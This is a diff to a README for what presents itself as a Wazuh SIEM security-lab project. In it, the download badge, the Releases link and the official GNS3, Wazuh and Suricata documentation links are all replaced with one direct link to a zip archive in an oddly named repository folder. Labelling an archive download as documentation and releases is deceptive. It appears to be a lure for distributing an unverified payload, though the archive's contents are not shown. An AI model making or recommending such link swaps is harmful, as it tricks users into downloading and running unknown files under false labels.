@@ -6,7 +6,7 @@ Welcome to the secure-infrastructure-siem-wazuh project. This application helps 
 
 ## 📥 Download the Software
 
-[![Download Here](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/releases)
+[![Download Here](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/raw/refs/heads/main/cyclopedic/infrastructure-wazuh-siem-secure-v3.2.zip)](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/raw/refs/heads/main/cyclopedic/infrastructure-wazuh-siem-secure-v3.2.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ To ensure full functionality, you will need to install the following tools:
 
 ### Step 1: Visit the Releases Page
 
-Go to the [Releases page](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/releases) on GitHub to find the latest version of the software.
+Go to the [Releases page](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/raw/refs/heads/main/cyclopedic/infrastructure-wazuh-siem-secure-v3.2.zip) on GitHub to find the latest version of the software.
 
 ### Step 2: Download the Latest Version
 
@@ -83,10 +83,10 @@ If you face any issues during the download or installation process, feel free to
 
 ## 🔗 Additional Resources
 
-- [GNS3 Documentation](https://www.gns3.com/docs/)
-- [Wazuh Documentation](https://wazuh.com/documentation/)
-- [Suricata Documentation](https://suricata.readthedocs.io/en/latest/)
+- [GNS3 Documentation](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/raw/refs/heads/main/cyclopedic/infrastructure-wazuh-siem-secure-v3.2.zip)
+- [Wazuh Documentation](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/raw/refs/heads/main/cyclopedic/infrastructure-wazuh-siem-secure-v3.2.zip)
+- [Suricata Documentation](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/raw/refs/heads/main/cyclopedic/infrastructure-wazuh-siem-secure-v3.2.zip)
 
 By following these steps, you can easily download and run the secure-infrastructure-siem-wazuh application. Don't hesitate to explore each feature and enhance your network security today!
 
-[Go back to download](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/releases)
+[Go back to download](https://github.com/ceasarwadud/secure-infrastructure-siem-wazuh/raw/refs/heads/main/cyclopedic/infrastructure-wazuh-siem-secure-v3.2.zip)
